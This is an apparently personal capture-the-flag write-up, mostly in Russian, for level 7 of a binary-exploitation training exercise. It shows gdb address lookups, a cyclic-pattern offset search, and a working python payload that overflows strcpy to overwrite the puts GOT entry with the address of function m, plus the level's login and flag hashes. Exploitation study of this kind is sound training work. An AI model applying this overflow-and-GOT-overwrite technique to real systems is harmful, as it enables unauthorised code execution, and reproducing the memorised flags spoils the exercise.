@@ -1,0 +1,65 @@
+1. Login level7:f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+2. InvestigatioN. Сега, если не введём два аргумента, иначе возвращает ~~. 
+Внутри есть функция m, которая выводит нашу глобальную переменную.
+Внутри функции main, происходит копия двух аргументов, чтение пароля в нашу глобальную переменную.
+Получается нам надо переписать в GOT одну из вызываемых функций на m. puts выдаёт нам ~~, поэтому перепишем её из-за бесполезности
+
+3. Найдём всё что нам необходимо знать 
+
+Адрес функции m - 0x080484f4 
+
+(gdb) info functions m
+All functions matching regular expression "m":
+
+Non-debugging symbols:
+...
+0x080484f4  m
+
+(gdb) info function puts
+All functions matching regular expression "puts":
+
+Адрес функии puts - 0x8049928
+
+Non-debugging symbols:
+0x08048400  puts
+0x08048400  puts@plt
+(gdb) x/i puts
+   0x8048400 <puts@plt>:        jmp    *0x8049928
+(gdb)
+
+offset первого strcpy - 20
+На самом деле получилось через перебор, но нормальное решение было найти offset в одном из регистров. Это был edx
+
+(gdb) r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag' 'BBBB'
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/level7/level7 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag' 'BBBB'
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7eb1922 in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) i r
+eax            0x42424242       1111638594
+ecx            0xbffff902       -1073743614
+edx            0x37614136       929120566
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff63c       0xbffff63c
+ebp            0xbffff668       0xbffff668
+esi            0x0      0
+edi            0x0      0
+eip            0xb7eb1922       0xb7eb1922
+eflags         0x210246 [ PF ZF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+4. Готовим payload и запускаем программу
+
+argv[1] = "a" * 20 + "puts GOT addr"
+argv[2] -> puts GOT addr = "m addr"
+TODO:: why does it work?
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
